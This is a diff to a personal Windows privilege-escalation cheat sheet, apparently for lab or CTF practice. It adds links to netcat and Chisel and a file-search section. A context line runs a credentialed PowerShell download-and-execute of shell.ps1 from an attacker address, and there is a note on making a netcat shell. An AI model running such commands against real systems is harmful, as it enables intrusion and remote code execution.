@@ -16,11 +16,13 @@ Keep in mind:
     * appropriate write permissions
     * service start permission
     * service stop permission
-* To exploit AutoLogon services:
-    * Permissions to restart the machine
 * Look for non-standard programs on the system
 
 *Note: This is a live document. I'll be adding more content as I learn more*
+
+## Binaries
+Get 64-bit netcat from [here](https://eternallybored.org/misc/netcat/)
+Get Chisel from [here](https://github.com/jpillora/chisel/releases) 
 
 ## General Information
 ``` powershell
@@ -40,6 +42,7 @@ systeminfo
 
 # Both should be the same for ease of exploitation
 # PowerShell
+# Make a 64-bit shell using nc64.exe
 [environment]::Is64BitOperatingSystem
 [environment]::Is64BitProcess
 
@@ -200,6 +203,13 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
 ```
+
+## Find Files Fast
+``` powershell
+dir /s <filename> # or extensions
+Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
+```
+
 ## Port Forwarding 
 ``` powershell
 # If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
